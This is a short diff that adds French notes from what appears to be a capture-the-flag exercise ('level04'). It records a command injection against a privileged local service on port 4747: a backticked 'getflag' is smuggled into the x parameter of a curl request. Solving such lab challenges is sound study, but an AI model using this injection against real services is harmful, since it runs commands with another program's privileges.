@@ -1,0 +1,3 @@
+le program tourne en arriere plan sur le port 4747
+vue qu,il a les droit j'ai donc donc changer la valeur de la fonction x par getflag
+./level04.pl ; curl localhost:4747?x=\`getflag\`
